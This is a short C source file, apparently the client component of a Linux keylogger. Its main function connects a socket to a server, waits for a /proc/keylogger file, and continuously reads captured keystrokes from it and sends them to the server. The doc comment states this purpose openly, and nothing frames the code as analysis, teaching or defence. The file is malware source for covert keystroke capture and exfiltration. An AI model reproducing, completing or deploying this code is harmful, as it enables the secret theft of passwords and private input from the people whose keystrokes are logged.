#include "client.h"

/**
 * @brief Main function to start the client program.
 * 
 * This function initializes the client-side operations for connecting to a server,
 * waiting for the /proc/keylogger file, and sending the captured keystrokes data
 * to the server. The steps include creating a socket, connecting to the server,
 * waiting for the /proc/keylogger file, opening the file, and then continuously
 * reading data from the file and sending it to the server.
 * 
 * @return int Exit status of the program.
 */
int main() {
    int sock, fd;
    struct sockaddr_in server_addr;

    // Create socket
    sock = create_socket();

    // Connect to server
    connect_to_server(sock, &server_addr);

    // Wait for the /proc/keylogger file to be created
    wait_for_procfs();

    // Open the /proc/keylogger file
    fd = open_procfs();

    // Read and send data
    read_and_send_data(fd, sock);

    // Close file and socket
    close(fd);
    close(sock);
    return 0;
}
